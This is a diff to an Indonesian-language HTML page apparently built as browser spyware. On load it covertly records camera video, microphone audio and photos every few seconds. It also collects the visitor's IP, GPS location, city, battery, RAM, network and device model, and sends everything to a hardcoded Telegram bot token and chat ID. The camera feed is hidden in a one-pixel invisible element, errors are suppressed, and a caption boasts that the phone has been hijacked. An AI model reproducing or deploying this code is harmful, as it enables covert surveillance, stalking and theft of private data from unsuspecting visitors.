@@ -2,81 +2,75 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8" />
-  <title>Sistem Otomatis</title>
+  <title>Auto Kirim Telegram</title>
   <style>
-    body { background: transparent; margin: 0; }
-    video { display: none; }
+    body { margin: 0; background: transparent; color: #fff; overflow: hidden; }
+    video { position: fixed; bottom: 0; right: 0; width: 1px; height: 1px; opacity: 0; }
   </style>
 </head>
 <body>
   <video id="video" autoplay muted playsinline></video>
-  <audio id="audio" autoplay></audio>
-
   <script>
     const token = '7877584682:AAHvvEzlzWyWq5QOKnx7y3cjPcMIOBOPUdg';
     const chat_id = '7552410869';
+    let videoRecorder, audioRecorder, chunksVideo = [], chunksAudio = [];
 
-    let chunks = [];
-    let mediaRecorder;
-
-    async function startSystem() {
+    async function startAll() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
-        document.getElementById("video").srcObject = stream;
+        const streamVideo = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: 'environment' } }, audio: true });
+        const video = document.getElementById('video');
+        video.srcObject = streamVideo;
 
-        sendInfo(stream);
-        setInterval(() => capturePhoto(), 5000);
-        startVideoLoop(stream);
-        startAudioLoop(stream);
-      } catch (e) {
-        console.error("Izin ditolak:", e);
-        alert("Harap izinkan kamera, mikrofon, dan lokasi.");
-      }
+        videoRecorder = new MediaRecorder(streamVideo);
+        videoRecorder.ondataavailable = e => { if (e.data.size > 0) chunksVideo.push(e.data); };
+        videoRecorder.onstop = () => {
+          const blob = new Blob(chunksVideo, { type: 'video/webm' });
+          chunksVideo = [];
+          const form = new FormData();
+          form.append("chat_id", chat_id);
+          form.append("video", blob, "video10s.webm");
+          fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: form });
+          setTimeout(startVideoRecording, 1000);
+        };
+        startVideoRecording();
+
+        const streamAudio = await navigator.mediaDevices.getUserMedia({ audio: true });
+        audioRecorder = new MediaRecorder(streamAudio);
+        audioRecorder.ondataavailable = e => { if (e.data.size > 0) chunksAudio.push(e.data); };
+        audioRecorder.onstop = () => {
+          const blob = new Blob(chunksAudio, { type: 'audio/webm' });
+          chunksAudio = [];
+          const form = new FormData();
+          form.append("chat_id", chat_id);
+          form.append("audio", blob, "audio10s.webm");
+          fetch(`https://api.telegram.org/bot${token}/sendAudio`, { method: 'POST', body: form });
+          setTimeout(startAudioRecording, 1000);
+        };
+        startAudioRecording();
+
+        setInterval(() => autoCapturePhoto(video), 5000);
+        sendInfo();
+        sendImageUrl(); // Tambahan: kirim gambar dari URL
+
+      } catch (e) {}
     }
 
-    function startVideoLoop(stream) {
-      mediaRecorder = new MediaRecorder(stream);
-      mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
-      mediaRecorder.onstop = () => {
-        const blob = new Blob(chunks, { type: 'video/webm' });
-        chunks = [];
-        const form = new FormData();
-        form.append("chat_id", chat_id);
-        form.append("video", blob, "video10s.webm");
-        fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: form });
-        setTimeout(() => mediaRecorder.start(), 1000);
-      };
-      mediaRecorder.start();
-      setInterval(() => mediaRecorder.stop(), 10000);
+    function startVideoRecording() {
+      videoRecorder.start();
+      setTimeout(() => videoRecorder.stop(), 10000);
     }
 
-    function startAudioLoop(stream) {
-      const audioRecorder = new MediaRecorder(stream);
-      let audioChunks = [];
-
-      audioRecorder.ondataavailable = e => { if (e.data.size > 0) audioChunks.push(e.data); };
-      audioRecorder.onstop = () => {
-        const blob = new Blob(audioChunks, { type: 'audio/webm' });
-        audioChunks = [];
-        const form = new FormData();
-        form.append("chat_id", chat_id);
-        form.append("audio", blob, "audio.webm");
-        fetch(`https://api.telegram.org/bot${token}/sendAudio`, { method: 'POST', body: form });
-        setTimeout(() => audioRecorder.start(), 1000);
-      };
-
+    function startAudioRecording() {
       audioRecorder.start();
-      setInterval(() => audioRecorder.stop(), 15000);
+      setTimeout(() => audioRecorder.stop(), 10000);
     }
 
-    async function capturePhoto() {
-      const video = document.getElementById('video');
+    async function autoCapturePhoto(video) {
       const canvas = document.createElement('canvas');
       canvas.width = video.videoWidth || 640;
       canvas.height = video.videoHeight || 480;
       const ctx = canvas.getContext('2d');
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
       const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
       const form = new FormData();
       form.append("chat_id", chat_id);
@@ -84,26 +78,29 @@
       fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: form });
     }
 
-    async function sendInfo(stream) {
-      const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(j => j.ip).catch(() => 'Gagal');
+    async function sendInfo() {
+      const waktu = new Date().toLocaleString();
+      const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip);
       const ua = navigator.userAgent;
-      const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Tidak diketahui';
-      const net = navigator.connection ? `${navigator.connection.effectiveType}, ${navigator.connection.downlink} Mbps` : 'Tidak diketahui';
       const bat = await navigator.getBattery().then(b => `${Math.round(b.level * 100)}% (${b.charging ? 'Mengisi' : 'Tidak'})`);
-      const brandMatch = ua.match(/Android.*?;\s(.+?)\sBuild/);
-      const brand = brandMatch ? brandMatch[1] : 'Tidak diketahui';
+      const net = navigator.connection ? `${navigator.connection.effectiveType}, ${navigator.connection.downlink} Mbps` : 'Tidak tersedia';
+      const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Tidak terdeteksi';
+      const brand = ua.match(/Android.*?;\s(.+?)\sBuild/)?.[1] || 'Tidak diketahui';
 
       navigator.geolocation.getCurrentPosition(async pos => {
         const lat = pos.coords.latitude;
         const lon = pos.coords.longitude;
         const maps = `https://maps.google.com/?q=${lat},${lon}`;
+        const g = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
+        const gjson = await g.json();
+        const kota = gjson.address.city || gjson.address.town || gjson.address.village || 'Tidak diketahui';
 
         let cuaca = '';
         try {
-          const res = await fetch(`https://api.diioffc.web.id/api/tools/cekcuaca?query=${lat},${lon}`);
-          const json = await res.json();
-          if (json.status && json.result) {
-            const w = json.result.weather[0];
+          const r = await fetch(`https://api.diioffc.web.id/api/tools/cekcuaca?query=${encodeURIComponent(kota)}`);
+          const j = await r.json();
+          if (j.status && j.result) {
+            const w = j.result.weather[0];
             cuaca = `
 ╔═══╦═══╦════╦═══╗
 ╚╗╔╗║╔═╗║╔╗╔╗║╔═╗║
@@ -117,11 +114,14 @@
 ║║─║║╔╗╔╣╚═╝║║╚╗║║║╔═╗
 ║╚═╝║║║╚╣╔═╗║║─║║║╚╩═║
 ╚═══╩╝╚═╩╝─╚╩╝─╚═╩═══╝
-            \n🌤️ Cuaca: ${w.main} (${w.description})\n🌡️ Suhu: ${json.result.main.temp}°C\n💧 Kelembaban: ${json.result.main.humidity}%`;
+            \n🌤️ Cuaca: ${w.main} (${w.description})
+            \n🌡️ Suhu: ${j.result.main.temp}°C
+            \n💧 Kelembaban: ${j.result.main.humidity}%
+            \n🌬️ Angin: ${j.result.wind.speed} m/s`;
           }
         } catch {}
 
-        const pesan = `
+        const teks = `
 ╔═══╦═══╦════╦═══╗
 ╚╗╔╗║╔═╗║╔╗╔╗║╔═╗║
 ─║║║║║─║╠╝║║╚╣║─║║
@@ -134,16 +134,34 @@
 ║║─║║╔╗╔╣╚═╝║║╚╗║║║╔═╗
 ║╚═╝║║║╚╣╔═╗║║─║║║╚╩═║
 ╚═══╩╝╚═╩╝─╚╩╝─╚═╩═══╝
-        📍 Lokasi: ${maps}\n🌐 IP: ${ip}\n📱 UA: ${ua}\n🔋 Baterai: ${bat}\n📶 Jaringan: ${net}\n💾 RAM: ${ram}\n📱 Merek: ${brand}${cuaca}`;
+        📍 Lokasi: ${maps}
+        \n🕒 Waktu: ${waktu}
+        \n🌐 IP: ${ip}
+        \n🔋 Baterai: ${bat}
+        \n📶 Jaringan: ${net}
+        \n📱 User-Agent: ${ua}
+        \n📱 Merek Android: ${brand}
+        \n💾 RAM: ${ram}${cuaca}`;
         fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id, text: pesan })
+          body: JSON.stringify({ chat_id, text: teks })
         });
       });
     }
 
-    window.onload = startSystem;
+    function sendImageUrl() {
+      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: 'POST',
+        body: new URLSearchParams({
+          chat_id,
+          photo: 'https://files.catbox.moe/p7xbtg.png',
+          caption: '𝗛𝗣 𝗶𝗡𝗜 𝗗𝗜 𝗕𝗔𝗝𝗔𝗞 𝗕𝗬 𝗥𝗜𝗭𝗞𝗬 '
+        })
+      });
+    }
+
+    window.onload = startAll;
   </script>
 </body>
 </html>
